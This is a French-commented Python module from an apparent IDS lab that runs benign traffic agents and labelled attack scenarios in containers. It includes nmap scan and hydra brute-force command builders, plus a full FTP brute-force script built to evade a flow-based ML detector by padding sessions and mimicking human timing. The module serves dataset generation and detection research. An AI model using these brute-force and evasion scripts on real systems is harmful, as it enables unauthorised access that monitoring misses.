"""
Génération du trafic du réseau instancié : trafic « bénin » de fond et attaques.

Les deux reposent sur le même mécanisme (LabManager.start_netns_helper) : un
conteneur jetable qui partage la pile réseau d'un équipement, donc tout ce qu'il
envoie semble venir de cet équipement.

  - trafic bénin : un agent imite un utilisateur sur un PC (web, SSH, FTP…). Il
    sert de trafic « normal » de référence pour la sonde IDS (voir traffic_agent.py).
  - scénario d'audit : une attaque typique (scan nmap, force brute hydra) lancée
    au nom d'un équipement vers une cible, et étiquetée pour servir d'exemple « attaque ».

Tout ce que ce module crée porte un rôle (« traffic » ou « scenario ») : l'arrêt
du réseau le supprime, et on peut l'arrêter seul.
"""

import io
import json
import logging
import re
import tarfile
import threading
import time
from datetime import datetime, timezone
from pathlib import Path

from docker.errors import DockerException
from fastapi import HTTPException

from .lab import LabManager
from .settings import PREFIX

log = logging.getLogger(__name__)

AGENT_SOURCE = (Path(__file__).parent / "traffic_agent.py").read_text(encoding="utf-8")

# Compte de démonstration des serveurs (créé dans docker/server/Dockerfile) :
# cible des forces brutes, et compte utilisé par l'agent bénin.
LAB_USER = "labuser"
LAB_PASSWORD = "password123"

# Types de trafic bénin (voir traffic_agent.py) : le ping, et les trois services d'un serveur.
BENIGN_KINDS = ("icmp", "http", "ssh", "ftp")

# Cible acceptée : une adresse IPv4 ou un sous-réseau. S'y limiter empêche toute
# injection quand la cible est insérée dans une commande shell (force brute hydra).
TARGET_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}(?:/\d{1,2})?$")

# Liste de mots de passe : des faux d'abord, le vrai en dernier. La force brute
# enchaîne des échecs réalistes puis « réussit » (ce qui illustre l'attaque).
# Assez longue pour produire des dizaines de flux, de quoi entraîner un modèle.
_COMMON = ["admin", "123456", "root", "toor", "qwerty", "password", "letmein", "welcome", "dragon", "monkey"]
WORDLIST = [*_COMMON, *(f"{w}{n}" for w in _COMMON for n in (1, 12, 2026, 99, 7)), LAB_PASSWORD]

# Vitesses d'attaque. Faire varier le rythme diversifie les flux d'un dataset.
#   nmap  : modèle de temporisation -T (parfois --scan-delay / --max-rate) ;
#   hydra : -t connexions en parallèle, -W attente.
# « evasion » est à part : une attaque furtive, très étalée dans le temps, à lancer
# CONTRE un modèle déjà entraîné (pas pour l'entraîner). En ralentissant beaucoup,
# ses features de temps sortent de la zone « attaque » apprise et le modèle peut la
# classer bénigne (temporisation, état de l'art Han/Sharon ; voir le rapport d'évasion).
SPEEDS = {
    "slow": {"label": "Lente", "nmap": "-T2", "hydra": "-t 1"},
    "normal": {"label": "Normale", "nmap": "-T3", "hydra": "-t 2"},
    "fast": {"label": "Rapide", "nmap": "-T4", "hydra": "-t 4"},
    "insane": {"label": "Très rapide", "nmap": "-T5", "hydra": "-t 16"},
    "evasion": {"label": "Évasion (furtif, temporisé)",
                "nmap": "-T2 --scan-delay 250ms --max-rate 8",
                "hydra": "-t 1 -W 1"},
}
DEFAULT_SPEED = "fast"

# Profils de trafic bénin (le détail du rythme est dans traffic_agent.PROFILES).
BENIGN_PROFILES = {
    "slow": "Lente (~1 session / 10 s)",
    "moderate": "Modérée (~1 session / 3 s)",
    "steady": "Soutenue (~1 session / s, 2 en parallèle)",
    "intense": "Intense (~3 sessions / s, 3 en parallèle)",
}


def _nmap_cmd(*args):
    """Fabrique une commande nmap ; la cible et la vitesse sont ajoutées au lancement."""
    return lambda target, speed: ["nmap", *args, *SPEEDS[speed]["nmap"].split(), target]


def _hydra_cmd(service):
    """Fabrique une commande hydra qui teste la WORDLIST sur un service (ssh, ftp)."""
    def build(target, speed):
        passwords = " ".join(WORDLIST)
        flags = SPEEDS[speed]["hydra"]
        return ["sh", "-c",
                f"printf '%s\\n' {passwords} > /tmp/pw.txt && "
                f"hydra -l {LAB_USER} -P /tmp/pw.txt {flags} -f -I {service}://{target}"]
    return build


# Force brute FTP « furtive » (évasion par mimétisme, inspirée d'Okada et al.).
#
# Le modèle décide PAR FLUX, et ce qui trahit une force brute n'est ni le client ni le
# rythme entre tentatives, mais la FORME du flux : un login raté est un flux pauvre
# (peu de paquets, peu d'octets, peu de drapeaux PSH, long à cause du délai anti-force-
# brute du serveur), là où une vraie session bénigne est riche (beaucoup d'allers-retours
# de commandes). Le modèle a appris « flux FTP pauvre = attaque ».
#
# L'évasion (Okada, « XAI-driven » : perturber précisément les features que le modèle
# utilise vers la zone bénigne). Les features décisives du modèle sont des TAILLES de paquet
# (Packet Length Mean/Std, Average Packet Size, Flow Bytes/s) : un login raté est un flux
# minuscule (quelques octets), une session bénigne échange de vrais octets. On étoffe donc
# chaque tentative avec de vraies commandes FTP, dont certaines portent une grande ligne
# d'arguments (plusieurs centaines d'octets) et d'autres (HELP, FEAT) reçoivent une réponse
# longue : la taille moyenne des paquets et le débit du flux montent dans la zone bénigne.
# Le modèle par flux ne le distingue plus d'une session normale. On garde le même client que
# l'agent bénin (ftplib) et une cadence humaine entre les tentatives.
_FTP_STEALTH = r'''
import ftplib, random, sys, time
TARGET = sys.argv[1]
USER = %USER%
WORDLIST = %WORDLIST%
REMOTE = ["notes.txt", "data/ventes.csv", "data/rapport.pdf", "backup/archive.tar.gz"]
FILLER = "la session consulte le catalogue et verifie les fichiers du serveur " * 8  # ~530 octets
rng = random.Random()
def think(a, b): time.sleep(rng.uniform(a, b))
def pad(ftp, n):
    # Mélange de commandes : les unes portent une grosse ligne d'arguments (octets ALLER),
    # les autres reçoivent une réponse longue (octets RETOUR). Le serveur répond à tout.
    for _ in range(n):
        if rng.random() < 0.6:
            cmd = "NOOP " + FILLER[:rng.randint(120, 500)]   # grosse ligne vers le serveur
        else:
            cmd = rng.choice(["HELP", "FEAT", "STAT", "HELP SITE"])  # grosse réponse du serveur
        try:
            ftp.putline(cmd)         # envoie la ligne
            ftp.getmultiline()       # lit la réponse (sans lever sur un code d'erreur)
        except Exception: pass
        time.sleep(rng.uniform(0.05, 0.3))  # cadence "frappe au clavier", comme une session
def attempt(pw):
    ftp = ftplib.FTP()
    try:
        ftp.connect(TARGET, 21, timeout=10)
        pad(ftp, rng.randint(6, 10))     # etoffe le flux AVANT l'essai : forme d'une session
        try:
            ftp.login(USER, pw)
        except ftplib.error_perm:
            pad(ftp, rng.randint(4, 8))  # encore des commandes apres l'echec
            return False
        try:
            ftp.retrlines("LIST", lambda _l: None)
            for _ in range(rng.randint(1, 3)):
                think(0.5, 2.5)
                ftp.retrbinary("RETR " + rng.choice(REMOTE), lambda _c: None)
        except Exception:
            pass
        try: ftp.quit()
        except Exception: pass
        return True
    except Exception:
        return False
    finally:
        try: ftp.close()
        except Exception: pass
found = None
for pw in WORDLIST:
    if attempt(pw):
        found = pw
        break
    think(1.0, 4.0)  # cadence humaine, pas une rafale hydra
# Verdict lu par le backend (attack_result) pour afficher si l'attaque a abouti.
if found:
    print("RESULTAT: OK", USER, found)
else:
    print("RESULTAT: FAIL")
'''


def _ftp_stealth_cmd(target, speed):
    """Force brute FTP mimant le client bénin (la vitesse est ignorée : cadence « humaine »)."""
    script = _FTP_STEALTH.replace("%USER%", repr(LAB_USER)).replace("%WORDLIST%", repr(list(WORDLIST)))
    return ["python3", "-c", script, target]


# Catalogue des attaques. Pour chacune :
#   needs   : "ip" (une machine) ou "subnet" (un sous-réseau entier)
#   label   : (catégorie, sous-catégorie) donnée aux flux produits (pour l'étiquetage)
#   command : construit la commande à partir de la cible et de la vitesse
ATTACKS = {
    "ping-sweep": {
        "name": "Balayage de découverte", "needs": "subnet", "tool": "nmap",
        "description": "Repère les machines actives d'un sous-réseau (nmap -sn).",
        "label": ("reconnaissance", "ping-sweep"), "command": _nmap_cmd("-sn"),
    },
    "tcp-connect-scan": {
        "name": "Scan de ports (connect)", "needs": "ip", "tool": "nmap",
        "description": "Teste les 200 ports les plus courants d'une machine (nmap -sT).",
        "label": ("reconnaissance", "port-scan"), "command": _nmap_cmd("-sT", "--top-ports", "200"),
    },
    "syn-scan": {
        "name": "Scan de ports furtif (SYN)", "needs": "ip", "tool": "nmap",
        "description": "Scan SYN de tous les ports, sans ouvrir de connexion complète (nmap -sS).",
        "label": ("reconnaissance", "syn-scan"), "command": _nmap_cmd("-sS", "-p-"),
    },
    "service-scan": {
        "name": "Identification des services", "needs": "ip", "tool": "nmap",
        "description": "Identifie les logiciels et versions derrière les ports ouverts (nmap -sV).",
        "label": ("reconnaissance", "service-detection"), "command": _nmap_cmd("-sV", "--top-ports", "100"),
    },
    "aggressive-scan": {
        "name": "Scan approfondi", "needs": "ip", "tool": "nmap",
        "description": "Scan complet : services, système, scripts par défaut (nmap -A).",
        "label": ("reconnaissance", "aggressive-scan"), "command": _nmap_cmd("-A"),
    },
    "ssh-bruteforce": {
        "name": "Force brute SSH", "needs": "ip", "tool": "hydra", "service": "ssh",
        "description": f"Essaie plusieurs mots de passe sur le compte « {LAB_USER} » en SSH (hydra).",
        "label": ("force-brute", "ssh-patator"), "command": _hydra_cmd("ssh"),
    },
    "ftp-bruteforce": {
        "name": "Force brute FTP", "needs": "ip", "tool": "hydra", "service": "ftp",
        "description": f"Essaie plusieurs mots de passe sur le compte « {LAB_USER} » en FTP (hydra).",
        "label": ("force-brute", "ftp-patator"), "command": _hydra_cmd("ftp"),
    },
    "ftp-bruteforce-stealth": {
        "name": "Force brute FTP (furtive, évasion)", "needs": "ip", "tool": "python-ftp", "service": "ftp",
        "description": ("Force brute FTP qui donne à chaque essai la forme d'une session bénigne "
                        "(client ftplib, commandes de remplissage, cadence humaine) : le modèle par flux "
                        "ne la distingue plus du trafic normal (évasion inspirée d'Okada)."),
        "label": ("force-brute", "ftp-patator-stealth"), "command": _ftp_stealth_cmd,
    },
}


def command_preview(attack_id, speed, target="<cible>"):
    """Commande lancée par une attaque, en version lisible (la WORDLIST est résumée)."""
    attack = ATTACKS[attack_id]
    if attack["tool"] == "hydra":
        return (f"hydra -l {LAB_USER} -P <{len(WORDLIST)} mots de passe> {SPEEDS[speed]['hydra']} "
                f"-f {attack['service']}://{target}")
    if attack["tool"] == "python-ftp":
        return f"python3 ftp_stealth.py {target}  # {len(WORDLIST)} essais à cadence humaine"
    return " ".join(attack["command"](target, speed))


def attack_catalog():
    """Les attaques décrites pour l'interface (sans les fonctions internes)."""
    return [{"id": key, "name": a["name"], "description": a["description"],
             "needs": a["needs"], "category": a["label"][0], "subcategory": a["label"][1]}
            for key, a in ATTACKS.items()]


def speed_catalog():
    return [{"id": k, "label": v["label"]} for k, v in SPEEDS.items()]


def attack_result(attack, logs):
    """Verdict « l'attaque a-t-elle abouti ? » lu dans la sortie de l'outil.

    Indépendant de la détection : une attaque peut réussir tout en étant furtive.
    Renvoie {ok: bool, text: str}, ou None si on ne peut pas conclure.
    """
    if not logs or not attack:
        return None
    tool = attack.get("tool")
    subcategory = attack["label"][1] if "label" in attack else ""

    if tool == "hydra":  # force brute SSH / FTP : hydra imprime les identifiants trouvés
        m = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", logs)
        if m:
            return {"ok": True, "text": f"mot de passe trouvé : {m.group(1)} / {m.group(2)}"}
        return {"ok": False, "text": "aucun mot de passe trouvé"}
    if tool == "python-ftp":  # force brute furtive : verdict imprimé par le script
        m = re.search(r"RESULTAT:\s*OK\s+(\S+)\s+(\S+)", logs)
        if m:
            return {"ok": True, "text": f"mot de passe trouvé : {m.group(1)} / {m.group(2)}"}
        if "RESULTAT: FAIL" in logs:
            return {"ok": False, "text": "aucun mot de passe trouvé"}
        return None
    if tool == "nmap":
        if subcategory == "ping-sweep":  # balayage de découverte : machines actives
            hosts = len(re.findall(r"Host is up", logs))
            return {"ok": hosts > 0, "text": f"{hosts} machine(s) active(s)"}
        # scans de ports : les ports ouverts trouvés (ou aucun)
        ports = re.findall(r"^(\d+)/tcp\s+open", logs, re.M)
        if ports:
            return {"ok": True, "text": "ports ouverts : " + ", ".join(ports)}
        return {"ok": False, "text": "aucun port ouvert"}
    return None


def docker_time(value):
    """Horodatage Docker (« 2026-10-30T10:49:59.123456789Z ») → secondes epoch ; None si absent."""
    if not value or value.startswith("0001-"):
        return None
    main, _, frac = value.rstrip("Z").partition(".")
    try:
        moment = datetime.fromisoformat(f"{main}.{(frac or '0')[:6].ljust(6, '0')}")
    except ValueError:
        return None
    return moment.replace(tzinfo=timezone.utc).timestamp()


class TrafficManager:
    def __init__(self, lab: LabManager):
        self.lab = lab
        self._stopped = set()   # ids courts des scénarios interrompus depuis l'interface
        self._paused = {}       # équipement → agent bénin mis en pause le temps d'une attaque

    # ------------------------------------------------------------------ petits utilitaires

    def require_device(self, node_id, what):
        """Conteneur allumé d'un équipement, ou erreur HTTP 409 si éteint."""
        device = self.lab.find_device(node_id)
        if device is None or device.status != "running":
            raise HTTPException(409, f"{what} : l'équipement est éteint (démarrez le réseau).")
        return device

    def name_of(self, container):
        """Nom affiché d'un équipement : son hostname (« PC-1 »), fixé dans le docker-compose.yml."""
        return container.attrs["Config"]["Hostname"]

    def device_ip(self, container):
        """Première adresse IP du conteneur (pour étiqueter les flux)."""
        try:
            container.reload()
            nets = container.attrs["NetworkSettings"]["Networks"]
            return next((n["IPAddress"] for n in nets.values() if n.get("IPAddress")), "")
        except (DockerException, KeyError, StopIteration):
            return ""

    def primary_interface(self, container):
        """Première interface « up » de l'équipement (eth0…), où capturer."""
        script = ('for d in /sys/class/net/*; do n=${d##*/}; [ "$n" = lo ] && continue; '
                  '[ "$(cat "$d/operstate" 2>/dev/null)" = up ] && { echo "$n"; break; }; done')
        try:
            name = container.exec_run(["sh", "-c", script]).output.decode(errors="replace").strip()
            return name or "eth0"
        except DockerException:
            return "eth0"

    def extract_file(self, container, path):
        """Récupère un fichier du conteneur (l'API Docker le renvoie dans une archive tar)."""
        stream, _ = container.get_archive(path)
        buffer = io.BytesIO(b"".join(stream))
        with tarfile.open(fileobj=buffer) as tar:
            member = next((m for m in tar.getmembers() if m.isfile()), None)
            if member is None:
                raise ValueError("pcap introuvable dans la capture")
            return tar.extractfile(member).read()

    # ------------------------------------------------------------------ trafic bénin

    def start_benign(self, node_id, profile, targets, dest="all", kinds=None):
        """(Re)lance l'agent bénin sur un PC (un seul par équipement). `targets` : [{ ip, server }] ;
        `dest` est un libellé d'affichage ; `kinds` liste les types de trafic (voir traffic_agent.py)."""
        device = self.require_device(node_id, "Trafic de fond")
        self.stop_benign(node_id)
        self._paused.pop(node_id, None)

        config = {
            "profile": profile,
            "kinds": kinds or ["icmp"],
            "targets": targets,
            "account": {"user": LAB_USER, "password": LAB_PASSWORD},
        }
        command = ["python3", "-u", "-c", AGENT_SOURCE, json.dumps(config)]
        self.lab.start_netns_helper(device, command, role="traffic",
                                    attached=node_id, profile=profile, dest=dest or "all")
        log.info("Trafic bénin « %s » démarré sur %s → %s", profile, self.name_of(device), dest)
        return {"node": node_id, "profile": profile, "dest": dest or "all", "running": True}

    def stop_benign(self, node_id=None):
        """Arrête l'agent d'un équipement, ou tous les agents si node_id est None."""
        removed = 0
        for helper in self.lab.helpers("traffic"):
            if node_id and helper.labels.get(f"{PREFIX}.attached") != node_id:
                continue
            try:
                helper.remove(force=True)
                removed += 1
            except DockerException:
                pass  # déjà supprimé
        return removed

    # ------------------------------------------------------------------ scénarios d'audit

    def run_scenario(self, source_id, attack_id, target, speed=DEFAULT_SPEED):
        """Lance une attaque depuis `source_id` vers `target` (IP ou sous-réseau), une fois."""
        target = (target or "").strip()
        if not TARGET_RE.match(target):
            raise HTTPException(400, "Cible invalide : attendez une adresse IP ou un sous-réseau (ex. 10.0.20.10).")
        device = self.require_device(source_id, "Scénario")
        attack = ATTACKS[attack_id]
        category, subcategory = attack["label"]

        self._pause_benign(source_id)  # la source ne fait que l'attaque pendant sa fenêtre
        helper = self.lab.start_netns_helper(
            device, attack["command"](target, speed), role="scenario",
            attached=source_id, attack=attack_id, target=target,
            category=category, subcategory=subcategory, speed=speed, started=str(int(time.time())),
        )
        # Relance l'agent bénin quand l'attaque se termine (dans un thread, sans bloquer la réponse).
        threading.Thread(target=self._resume_after, args=(helper, source_id), daemon=True).start()
        log.info("Scénario « %s » lancé depuis %s vers %s", attack_id, self.name_of(device), target)
        return self._scenario_info(helper)

    def scenario_logs(self, scenario_id):
        """Sortie d'un scénario (le résultat du scan), pour l'afficher dans l'interface."""
        for helper in self.lab.helpers("scenario"):
            if helper.id.startswith(scenario_id):
                return helper.logs().decode(errors="replace")
        raise HTTPException(404, "Scénario introuvable (le réseau a peut-être été arrêté).")

    def list_scenarios(self):
        scenarios = [self._scenario_info(h) for h in self.lab.helpers("scenario")]
        scenarios.sort(key=lambda s: s["started"], reverse=True)
        return scenarios

    def stop_scenarios(self, scenario_id=None):
        """Interrompt un scénario en cours (ou tous). Le conteneur est arrêté, pas
        supprimé : la détection garde la vraie fenêtre de temps de l'attaque."""
        stopped = 0
        for helper in self.lab.helpers("scenario"):
            if scenario_id and not helper.id.startswith(scenario_id):
                continue
            try:
                helper.reload()
                if helper.status != "running":
                    continue
                helper.stop(timeout=1)
                self._stopped.add(helper.id[:12])
                stopped += 1
            except DockerException:
                pass
        return stopped

    def clear_scenarios(self):
        """Supprime les scénarios terminés (garde ceux encore en cours)."""
        removed = 0
        for helper in self.lab.helpers("scenario"):
            try:
                helper.reload()
                if helper.status == "running":
                    continue
                helper.remove(force=True)
                self._stopped.discard(helper.id[:12])
                removed += 1
            except DockerException:
                pass
        return removed

    def overview(self):
        """Résumé de l'activité : agents bénins en cours et scénarios."""
        benign = [{"node": h.labels.get(f"{PREFIX}.attached"),
                   "profile": h.labels.get(f"{PREFIX}.profile"),
                   "dest": h.labels.get(f"{PREFIX}.dest", "all")}
                  for h in self.lab.helpers("traffic") if h.status == "running"]
        return {"benign": benign, "scenarios": self.list_scenarios()}

    # ------------------------------------------------------------------ pause / reprise du bénin

    def _pause_benign(self, node_id):
        """
        Suspend l'agent bénin de la source pendant son attaque : tout flux de la
        source vers la cible est alors bien de l'attaque, ce qui garde la vérité
        terrain propre (l'agent ne compte pas comme des attaques manquées).
        """
        for helper in self.lab.helpers("traffic"):
            if helper.labels.get(f"{PREFIX}.attached") == node_id and helper.status == "running":
                self._paused[node_id] = {
                    "command": helper.attrs["Config"]["Cmd"],
                    "profile": helper.labels.get(f"{PREFIX}.profile", ""),
                    "dest": helper.labels.get(f"{PREFIX}.dest", "all"),
                }
                self.stop_benign(node_id)

    def _resume_benign(self, node_id):
        """Relance l'agent suspendu, une fois la DERNIÈRE attaque de cet équipement terminée."""
        still_attacking = any(
            h.status == "running" and h.labels.get(f"{PREFIX}.attached") == node_id
            for h in self.lab.helpers("scenario")
        )
        if node_id not in self._paused or still_attacking:
            return
        saved = self._paused.pop(node_id)
        device = self.lab.find_device(node_id)
        if device is None or device.status != "running":
            return  # réseau arrêté pendant l'attaque
        self.lab.start_netns_helper(device, saved["command"], role="traffic",
                                    attached=node_id, profile=saved["profile"], dest=saved["dest"])

    def _resume_after(self, attack_helper, source_id):
        """Attend la fin de l'attaque, puis relance le trafic bénin suspendu de la source."""
        self._wait_until_finished(attack_helper)
        time.sleep(1.0)  # l'agent reprend après la marge de fin d'attaque de la vérité terrain
        self._resume_benign(source_id)

    @staticmethod
    def _wait_until_finished(helper):
        """Attend la fin réelle d'une attaque (ou la disparition de son conteneur)."""
        try:
            helper.reload()
            while helper.status == "running":
                time.sleep(0.5)
                helper.reload()
        except DockerException:
            pass

    def _scenario_info(self, helper):
        """Décrit un scénario pour l'interface : cible, vitesse, durée, état."""
        labels = helper.labels
        attack_id = labels.get(f"{PREFIX}.attack", "")
        attack = ATTACKS.get(attack_id, {})
        try:
            helper.reload()
            state = helper.attrs.get("State", {})
            exit_code = state.get("ExitCode")
            began = docker_time(state.get("StartedAt", ""))
            ended = docker_time(state.get("FinishedAt", "")) if helper.status != "running" else time.time()
        except DockerException:
            exit_code = began = ended = None
        speed = labels.get(f"{PREFIX}.speed", DEFAULT_SPEED)
        target = labels.get(f"{PREFIX}.target", "")
        scenario_id = helper.id[:12]
        status = "stopped" if helper.status != "running" and scenario_id in self._stopped else helper.status

        # Verdict de l'attaque (a-t-elle abouti ?), lu dans la sortie une fois terminée.
        result = None
        if status != "running":
            try:
                result = attack_result(attack, helper.logs().decode(errors="replace"))
            except DockerException:
                pass

        return {
            "id": scenario_id,
            "attack": attack_id,
            "name": attack.get("name", attack_id),
            "source": labels.get(f"{PREFIX}.attached", ""),
            "target": target,
            "speed": SPEEDS.get(speed, {}).get("label", speed),
            "command": command_preview(attack_id, speed, target) if attack else "",
            "durationSec": round(ended - began, 1) if began and ended else None,
            "category": labels.get(f"{PREFIX}.category", ""),
            "subcategory": labels.get(f"{PREFIX}.subcategory", ""),
            "started": int(labels.get(f"{PREFIX}.started", "0") or 0),
            # running | exited | stopped (interrompu depuis l'interface)
            "status": status,
            "exitCode": exit_code,
            "result": result,  # {ok, text} ou null
        }
